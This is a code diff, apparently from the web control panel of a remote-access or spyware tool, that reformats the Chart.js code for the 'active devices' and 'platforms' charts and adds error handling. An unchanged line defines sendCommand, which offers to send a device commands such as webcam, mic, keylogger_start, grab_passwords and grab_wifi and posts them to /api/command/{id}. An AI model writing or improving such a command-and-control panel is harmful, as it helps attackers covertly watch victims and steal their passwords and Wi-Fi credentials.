@@ -252,9 +252,101 @@
         }
 
         function refreshCharts() {
-            fetch('/api/chart/activity').then(r=>r.json()).then(data=>{ const ctx=document.getElementById('activityChart').getContext('2d'); if(activityChart)activityChart.destroy(); activityChart=new Chart(ctx,{type:'line',data:{labels:data.labels||[],datasets:[{label:'<span data-i18n="active_devices">Dispositivi attivi</span>',data:data.data||[],borderColor:'#8b5cf6',backgroundColor:'rgba(139,92,246,0.06)',fill:true,tension:0.4,pointRadius:2,pointBackgroundColor:'#8b5cf6',borderWidth:2}]},options:{responsive:true,maintainAspectRatio:true,plugins:{legend:{labels:{color:'rgba(255,255,255,0.3)',font:{size:9}}}},scales:{x:{ticks:{color:'rgba(255,255,255,0.12)',font:{size:8},maxTicksLimit:12},grid:{color:'rgba(255,255,255,0.02)'}},y:{ticks:{color:'rgba(255,255,255,0.12)',font:{size:8},stepSize:1},grid:{color:'rgba(255,255,255,0.02)'}}}}}); });
-            fetch('/api/chart/platforms').then(r=>r.json()).then(data=>{ const ctx2=document.getElementById('platformChart').getContext('2d'); if(platformChart)platformChart.destroy(); platformChart=new Chart(ctx2,{type:'doughnut',data:{labels:data.labels||['Nessun dato'],datasets:[{data:data.data||[1],backgroundColor:data.colors||['rgba(255,255,255,0.05)'],borderColor:'transparent'}]},options:{responsive:true,maintainAspectRatio:true,plugins:{legend:{position:'bottom',labels:{color:'rgba(255,255,255,0.3)',font:{size:9},padding:8}}},cutout:'70%'}}); });
-        }
+    fetch('/api/chart/activity')
+        .then(function(res) { return res.json(); })
+        .then(function(data) {
+            var ctx = document.getElementById('activityChart').getContext('2d');
+            if (activityChart) activityChart.destroy();
+
+            activityChart = new Chart(ctx, {
+                type: 'line',
+                data: {
+                    labels: data.labels || [],
+                    datasets: [{
+                        label: 'Dispositivi attivi',  // <-- TESTO SENZA HTML
+                        data: data.data || [],
+                        borderColor: '#8b5cf6',
+                        backgroundColor: 'rgba(139,92,246,0.06)',
+                        fill: true,
+                        tension: 0.4,
+                        pointRadius: 2,
+                        pointBackgroundColor: '#8b5cf6',
+                        borderWidth: 2
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: true,
+                    plugins: {
+                        legend: {
+                            labels: {
+                                color: 'rgba(255,255,255,0.3)',
+                                font: { size: 9 }
+                            }
+                        }
+                    },
+                    scales: {
+                        x: {
+                            ticks: {
+                                color: 'rgba(255,255,255,0.12)',
+                                font: { size: 8 },
+                                maxTicksLimit: 12
+                            },
+                            grid: { color: 'rgba(255,255,255,0.02)' }
+                        },
+                        y: {
+                            ticks: {
+                                color: 'rgba(255,255,255,0.12)',
+                                font: { size: 8 },
+                                stepSize: 1
+                            },
+                            grid: { color: 'rgba(255,255,255,0.02)' }
+                        }
+                    }
+                }
+            });
+        })
+        .catch(function(err) {
+            console.error('Activity chart error:', err);
+        });
+
+    fetch('/api/chart/platforms')
+        .then(function(res) { return res.json(); })
+        .then(function(data) {
+            var ctx2 = document.getElementById('platformChart').getContext('2d');
+            if (platformChart) platformChart.destroy();
+
+            platformChart = new Chart(ctx2, {
+                type: 'doughnut',
+                data: {
+                    labels: data.labels || ['Nessun dato'],
+                    datasets: [{
+                        data: data.data || [1],
+                        backgroundColor: data.colors || ['rgba(255,255,255,0.05)'],
+                        borderColor: 'transparent'
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: true,
+                    plugins: {
+                        legend: {
+                            position: 'bottom',
+                            labels: {
+                                color: 'rgba(255,255,255,0.3)',
+                                font: { size: 9 },
+                                padding: 8
+                            }
+                        }
+                    },
+                    cutout: '70%'
+                }
+            });
+        })
+        .catch(function(err) {
+            console.error('Platform chart error:', err);
+        });
+}
 
         function sendCommand(id) { const cmd=prompt('📡 Invia comando a '+id.substring(0,8)+'...\n\nscreenshot\nwebcam\nmic\nclipboard\nkeylogger_start\ngrab_passwords\ngrab_wifi\nlist_files C:\\','screenshot'); if(cmd){ fetch(`/api/command/${id}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:cmd,params:''})}).then(()=>alert('✅ Comando inviato')).catch(()=>alert('❌ Errore')); } }
         function viewDevice(id) { alert('👁️ Dettagli dispositivo: '+id); }
